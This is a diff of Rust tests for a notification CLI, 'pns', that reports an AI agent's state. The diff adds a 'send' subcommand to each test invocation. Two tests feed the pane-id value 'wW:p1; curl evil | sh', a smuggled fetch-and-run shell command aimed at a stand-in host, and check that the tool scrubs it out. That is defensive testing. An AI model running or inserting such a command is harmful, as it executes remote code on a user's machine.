@@ -6,7 +6,9 @@ fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
     let output = run(sandbox
         .pns()
         .env("PNS_IDLE_SECS", "0")
-        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
+        .args([
+            "send", "--agent", "claude", "--state", "done", "--detail", "x",
+        ])
         .args(["--pane", "wW:p1; curl evil | sh"]));
     assert!(sandbox.fired("macos-banner"));
     assert_eq!(sandbox.event("macos-banner")["pane"], "");
@@ -21,7 +23,7 @@ fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
     let sandbox = Sandbox::new("scrub-silent");
     let output = run(sandbox
         .pns()
-        .args(["--agent", "claude", "--state", "done"])
+        .args(["send", "--agent", "claude", "--state", "done"])
         .args(["--pane", "wW:p1; curl evil | sh"])
         .args(["--local-only", "--remote-only"]));
     assert!(!stderr(&output).contains("dropped a pane id"), "{output:?}");
@@ -34,6 +36,7 @@ fn a_non_unicode_argument_never_breaks_the_exit_zero_edge() {
     let sandbox = Sandbox::new("non-unicode");
     let output = run(sandbox
         .pns()
+        .arg("send")
         .arg(OsStr::from_bytes(&[0xff]))
         .args(["--local-only", "--remote-only"]));
     assert!(stdout(&output).contains("SKIPPED"), "{output:?}");
@@ -152,8 +155,8 @@ fn help_in_flag_position_wins_wherever_it_reaches_the_event_parser() {
     // R5-2 + H-A: help was checked at argv[1] only, so `--agent claude
     // --help` delivered the event with `--help` unconsumed, and `--
     // --help`/`stray --help` reached the lenient producer parser and did the
-    // same. `is_producer_argv` now counts `--help`/`-h` too, so all four
-    // shapes reach the parser's own help arm instead.
+    // same. Every shape reaches the parser's own help arm instead, and the
+    // subcommand in front of them is what says this is a send at all.
     for argv in [
         &["--agent", "claude", "--help"][..],
         &["--local-only", "--help"][..],
@@ -161,7 +164,12 @@ fn help_in_flag_position_wins_wherever_it_reaches_the_event_parser() {
         &["stray", "--help"][..],
     ] {
         let sandbox = Sandbox::new("help-anywhere");
-        let output = sandbox.pns().args(argv).output().expect("the engine runs");
+        let output = sandbox
+            .pns()
+            .arg("send")
+            .args(argv)
+            .output()
+            .expect("the engine runs");
         assert_eq!(output.status.code(), Some(0), "{argv:?}: {output:?}");
         assert!(stdout(&output).contains("usage"), "{argv:?}: {output:?}");
         assert_eq!(stderr(&output), "", "{argv:?}: {output:?}");
@@ -183,13 +191,15 @@ fn help_in_value_position_is_still_just_a_value() {
     // `--agent --help` warn-and-drop instead of delivering an agent whose
     // name literally is "--help". States are free-form the same way.
     let sandbox = Sandbox::new("help-as-agent-value");
-    run(sandbox.pns().args(["--agent", "--help", "--state", "done"]));
+    run(sandbox
+        .pns()
+        .args(["send", "--agent", "--help", "--state", "done"]));
     assert_eq!(sandbox.event("mobile")["agent"], "--help");
 
     let sandbox = Sandbox::new("help-as-state-value");
     run(sandbox
         .pns()
-        .args(["--agent", "claude", "--state", "--help"]));
+        .args(["send", "--agent", "claude", "--state", "--help"]));
     assert_eq!(sandbox.event("mobile")["state"], "--help");
 }
 
@@ -198,7 +208,7 @@ fn a_missing_value_warning_keeps_its_exact_sentence() {
     let sandbox = Sandbox::new("missing-value-warning");
     let output = run(sandbox
         .pns()
-        .args(["--detail", "--local-only", "--remote-only"]));
+        .args(["send", "--detail", "--local-only", "--remote-only"]));
     assert_eq!(
         stderr(&output),
         "pns: --detail given without a value; ignoring\n"
